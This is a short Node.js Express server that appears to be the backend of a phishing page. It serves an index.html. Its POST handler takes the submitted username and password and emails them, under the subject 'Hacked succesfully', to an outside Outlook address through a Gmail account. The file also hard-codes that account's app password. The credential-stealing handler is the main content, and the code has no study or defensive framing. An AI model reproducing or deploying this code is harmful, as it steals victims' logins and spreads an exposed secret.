import express from 'express';
import { fileURLToPath } from 'url';
import { dirname ,join} from 'path';
import cors from 'cors'
import nodemailer from 'nodemailer'
const app=express();
app.listen(1000,()=>{
    console.log('Server is done')
})
app.use(express.static('public'))
var dir=dirname(fileURLToPath(import.meta.url))
app.use(express.urlencoded({extended:true}))
app.use(cors())
app.get('/',(req,res)=>{
res.sendFile(dir+'/index.html')
})
app.post('/',(req,res)=>{
         const transporter = nodemailer.createTransport({
                service: "gmail",
                auth: {
                    user: "jasmehasofficial@gmail.com",
                    pass: "ldef vatg nxyo qtbg"  
                }
            });
            const mailOptions = {
                from: "jasmehasofficialgmail.com",
                to: "jasmehsidhuwebsite@outlook.com",
                subject: `Hacked succesfully`,
                text: `Email : ${req.body.username} , ${req.body.password}`
            };
            
            transporter.sendMail(mailOptions, (error, info) => {
                if (error) {
                    console.log(error);
                } else {
                    console.log("Email sent: " + info.response);
                }
            });
})
